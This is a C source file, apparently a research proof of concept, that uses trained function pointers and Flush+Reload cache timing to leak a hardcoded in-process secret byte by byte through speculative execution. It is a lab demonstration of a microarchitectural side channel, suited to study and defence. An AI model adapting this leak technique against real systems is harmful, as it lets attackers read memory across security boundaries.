#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <math.h>
#include "flush_reload.h"

// function pointer type
typedef void (*func_ptr)(unsigned char *, char);

char *secret = "SCSB";
int idx;

// 函数2和函数4
void func2(unsigned char *reload_buf, char leak_byte) {
    maccess(reload_buf, leak_byte);
    // printf("This is function 2.\n");
}

void func4(unsigned char *reload_buf, char leak_byte) {
    ;
    // printf("This is function 4.\n");
}

// global function pointer
func_ptr g_ptr;
func_ptr h_ptr;
func_ptr delta = func4;


void func1() {
    g_ptr = func2;  // save instruction to jump to func2
}

int calc(int i) {
    return i % 20 ? 0 : i & (1 << 3);
}

func_ptr func3() {
    for (int i = 1; i <= 16; i++)
        g_ptr = func4 + calc(i);  // save instruction to jump to func4
    return g_ptr;
}

int main() {
    /*
    func1();
    g_ptr();  // execute instruction to jump to func2
    printf("%p\n", g_ptr);

    func3();
    g_ptr();  // execute instruction to jump to func4
    printf("%p\n", g_ptr);

    printf("%p\n", delta);
    delta = delta - g_ptr;
    printf("%p\n", delta);
    */
    __attribute__((aligned(4096))) size_t results[LEAK_SIZE] = {0};
    unsigned char *reload_buf   = (unsigned char *) mmap(NULL, LEAK_SIZE*STRIDE, PROT_READ | PROT_WRITE,
                                                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    assert(reload_buf != MAP_FAILED);
    // assert(mprotect(&smc_leak, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);

    int leak_length = 4;
    for (int i = 0; i < leak_length; i++) {
        idx = i;
        memset(results, 0, sizeof(results));

        for(int j=0; j<ITER; j++)
        {
            flush(reload_buf);
            
            func1();
            
            h_ptr = func3();
            h_ptr(reload_buf, secret[idx]);
            
            reload(reload_buf, results);
        }

        printf("0x%016lx :\n", (uint64_t)(secret+i));
        print_results(results, ITER/500);
    }

    return 0;
}
